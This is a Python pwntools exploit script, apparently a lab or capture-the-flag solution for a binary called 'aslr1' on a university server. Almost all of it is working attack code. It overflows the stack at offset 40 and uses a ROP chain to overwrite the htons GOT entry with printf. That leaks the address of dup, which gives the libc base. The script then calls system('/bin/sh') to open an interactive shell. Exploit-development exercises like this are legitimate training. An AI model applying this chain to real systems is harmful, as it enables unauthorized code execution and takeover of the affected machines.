#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aslr1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'aslr1')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4441)
    else:
        return remote('localhost', 4441)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

addq = exe.sym['usefulGadgets'] + 4
pop_r15 = 0x004014aa
pop_rdi = 0x004014ab

io = start()

# io.send(cyclic(700)) -> 40

# pop_rdi,
# 0x0,
# pop_r15,
# exe.got[],
# addq

# 
# got e guarda l'indirizzo di htons
# p printf
# printf - htons
# cosi trovo la diff tra htons e printf, sovrascrivo nella got al posto di htons printf
print_minus_htons = -0xb6980

io.send(flat({
    40 : [
        pop_rdi,
        print_minus_htons,
        pop_r15,
        exe.got['htons'],
        addq,
        
        pop_rdi,
        exe.got['dup'],
        exe.plt['htons'], # printf
        exe.sym['child'],
    ]
}))

dup_leak = io.recv(8)
dup_leak = dup_leak.ljust(8, b'\x00')
dup_leak = u64(dup_leak)

libc.address = dup_leak - libc.sym['dup']

io.send(flat({
    40 : [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system'],
    ]
}))

io.interactive()
